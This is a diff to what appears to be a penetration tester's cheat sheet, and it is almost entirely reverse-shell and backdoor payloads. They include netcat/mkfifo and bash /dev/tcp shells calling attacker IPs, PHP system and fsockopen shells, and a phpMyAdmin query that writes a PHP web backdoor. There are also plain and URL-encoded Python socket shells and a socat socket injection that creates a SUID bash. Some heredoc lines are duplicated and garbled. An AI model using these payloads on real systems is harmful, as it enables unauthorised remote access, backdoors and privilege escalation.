@@ -6,7 +6,8 @@
 echo >> user_backups.sh 
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
 cat user_backups.sh
-
+"bash -c 'bash -i >& /dev/tcp/192.168.49.121/443 0>&1'"
+bash -c 'bash -i >& /dev/tcp/192.168.49.121/443 0>&1'
 
 
 #PHP Reverse Shells
@@ -15,3 +16,23 @@ cat user_backups.sh
 <?php system("bash -i >& /dev/tcp/10.11.0.99/443 0>&1"); ?>
 <?php shell_exec("bash -i >& /dev/tcp/192.168.119.172/443 0>&1"); ?>
 <?php $sock = fsockopen("10.11.0.99",5566); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
+
+
+#PHPmyadmin to shell
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+
+#python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.184",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.59%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
+
+# Creating simple reverse shell
+cat > script.sh <<EOF
+cat > script.sh <<EOF
+> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.4 4445 >/tmp/f
+<tmp/f|/bin/sh -i 2>&1|nc 192.168.118.5 4445 >/tmp/f
+> EOF
+EOF
+
+#Socket Command injecion
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/synapse_commander.s
+
